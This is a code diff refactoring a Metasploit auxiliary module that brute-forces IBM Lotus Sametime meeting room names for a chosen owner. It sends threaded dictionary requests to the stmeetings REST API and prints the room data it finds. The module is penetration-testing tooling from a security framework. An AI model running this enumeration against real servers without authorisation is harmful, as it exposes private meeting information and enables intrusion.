@@ -28,14 +28,14 @@ class Metasploit3 < Msf::Auxiliary
       'DefaultOptions' =>
         {
           'SSL' => true
-        },
+        }
     ))
+
     register_options(
       [
         Opt::RPORT(443),
         OptString.new('OWNER', [ true,  'The owner to brute-force meeting room names for', '']),
-        OptPath.new('DICT', [ true,  'The path to the userinfo script', '']),
-        OptBool.new('FULLDATA', [ true, 'Output full meeting room data', true]),
+        OptPath.new('DICT', [ true,  'The path to the userinfo script' ]),
         OptString.new('TARGETURI', [ true, 'Path to stmeetings', '/stmeetings/'])
       ], self.class)
 
@@ -47,8 +47,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run
-
-    print_status("Beginning IBM Lotus Notes Sametime Meeting Room Brute-force on #{peer}")
+    print_status("#{peer} - Beginning IBM Lotus Notes Sametime Meeting Room Brute-force on #{peer}")
     print_status("Using owner: #{datastore['OWNER']}")
 
     # test for expected response code on non-existant meeting room name
@@ -66,15 +65,15 @@ class Metasploit3 < Msf::Auxiliary
         }
     })
 
-    if not res
-      print_error("No response from server #{peer}")
+    unless res
+      print_error("#{peer} - No response, timeout")
       return
     end
 
     if res.code == 404 and res.body =~ /Room does not exist/i
-      vprint_status("Server responding to restapi requests as expected")
+      vprint_status("#{peer} - Server responding to restapi requests as expected")
     else
-      print_error("Unexpected response from server (#{res.code}). Quitting....")
+      print_error("#{peer} - Unexpected response from server (#{res.code}). Exiting...")
       return
     end
 
@@ -82,16 +81,15 @@ class Metasploit3 < Msf::Auxiliary
     @test_queue = Queue.new
     @output_lock = false
 
-    File.open(datastore['DICT']).each { |line| @test_queue.push(line.chomp) }
-    print_status("Loaded #{@test_queue.length} values from dictionary")
+    ::File.open(datastore['DICT']).each { |line| @test_queue.push(line.chomp) }
+    vprint_status("Loaded #{@test_queue.length} values from dictionary")
 
-    print_status("Beginning dictionary brute-force using (#{datastore['Threads']} Threads)")
-    test_length = 1 # initial test length set
+    print_status("#{peer} - Beginning dictionary brute-force using (#{datastore['Threads']} Threads)")
 
     while(not @test_queue.empty?)
       t = []
       nt = datastore['Threads'].to_i
-      nt = 1 if nt == 0
+      nt = 1 if nt <= 0
 
       if @test_queue.length < nt
         # work around issue where threads not created as the queue isn't large enough
@@ -102,16 +100,14 @@ class Metasploit3 < Msf::Auxiliary
         1.upto(nt) do
           t << framework.threads.spawn("Module(#{self.refname})-#{rhost}", false, @test_queue.shift) do |test_current|
             Thread.current.kill if not test_current
-
             res = make_request(test_current)
-
-            if res and not res.code == 404
+            if res.nil?
+              print_error("#{peer} - Timeout from server when testing room \"#{test_current}\"")
+            elsif res and res.code == 404
+              vprint_status("#{peer} - Room \"#{test_current}\" was not valid for owner #{datastore['OWNER']}")
+            else
               # check response for user data
               check_response(res, test_current)
-            elsif res and res.code == 404
-              vprint_status("Room \"#{test_current}\" was not valid for owner #{datastore['OWNER']}")
-            else
-              print_error("No response from server when testing (#{test_current})")
             end
           end
         end
@@ -137,28 +133,22 @@ class Metasploit3 < Msf::Auxiliary
       'uri'     =>  @reqpath,
       'method'  => 'GET',
       'ctype'   => 'text/html',
-      'vars_get' => {
-        'owner' => datastore['OWNER'],
-        'permaName' => test_current
+      'vars_get' =>
+        {
+          'owner' => datastore['OWNER'],
+          'permaName' => test_current
         }
     })
 
   end
 
+  # check the response for valid room information
   def check_response(res, test_current)
-
-    # check the response for valid room information
-
     begin
-      # check response exists AND that it validates as JSON before proceeding
-      if res.code.to_i == 200 and not JSON.parse(res.body).blank?
-        # successful response - extract room information
-        extract_room_data(res, test_current)
-        return true
-      elsif res.body =~ /Room does not exist/i
-        return false
-      else
-        print_error("Unexpected response received from server #{peer}")
+      if res.code.to_i == 200
+        json_room = JSON.parse(res.body)
+        # extract room information if there is data
+        output_table(json_room, test_current) unless json_room.blank?
       end
     rescue JSON::ParserError
       # non-JSON response - server may be overloaded
@@ -166,53 +156,39 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def extract_room_data(res, test_current)
-
-    # extract room data if not already present
-    begin
-      roominfo = JSON.parse(res.body)
-      output_table(roominfo, test_current)
-    rescue JSON::ParserError
-      print_error("Error reading JSON string, continuing")
+  def output_table(room_info, test_current)
+    unless datastore['VERBOSE']
+      print_good("New meeting room found: #{test_current}")
+      return
     end
 
-  end
-
-  def output_table(roominfo, test_current)
-
-    if datastore['FULLDATA']
-
-      # print output table for discovered meeting rooms
-
-      roomtbl = Msf::Ui::Console::Table.new(
-        Msf::Ui::Console::Table::Style::Default,
-          'Header' => "[IBM Lotus Sametime] Meeting Room #{test_current}",
-          'Prefix' => "",
-          'Postfix' => "\n",
-          'Indent' => 1,
-          'Columns' =>[
+    # print output table for discovered meeting rooms
+    roomtbl = Msf::Ui::Console::Table.new(
+      Msf::Ui::Console::Table::Style::Default,
+        'Header'  => "[IBM Lotus Sametime] Meeting Room #{test_current}",
+        'Prefix'  => "",
+        'Postfix' => "\n",
+        'Indent'  => 1,
+        'Columns' =>
+          [
             "Key",
             "Value"
-            ])
+          ]
+      )
 
-      roominfo['results'][0].each do | k,v |
-          if v.is_a?(Hash)
-            # breakdown Hash
-            roomtbl << [ k.to_s, '>>' ] # title line
-            v.each do | subk, subv |
-              roomtbl << [ "#{k.to_s}:#{subk.to_s}", subv.to_s || "-"]  if not v.nil? or v.empty?
-            end
-          else
-            roomtbl << [ k.to_s, v.to_s || "-"]  if not v.nil?
-          end
+    room_info['results'][0].each do |k, v|
+      if v.is_a?(Hash)
+        # breakdown Hash
+        roomtbl << [ k.to_s, '>>' ] # title line
+        v.each do | subk, subv |
+          roomtbl << [ "#{k.to_s}:#{subk.to_s}", subv.to_s || "-"]  if not v.nil? or v.empty?
+        end
+      else
+        roomtbl << [ k.to_s, v.to_s || "-"]  unless v.nil?
       end
-      # output table
-      print_good(roomtbl.to_s)
-
-    else
-      print_good("New meeting room found: #{test_current}")
     end
-
+    # output table
+    print_good(roomtbl.to_s)
 
   end
 
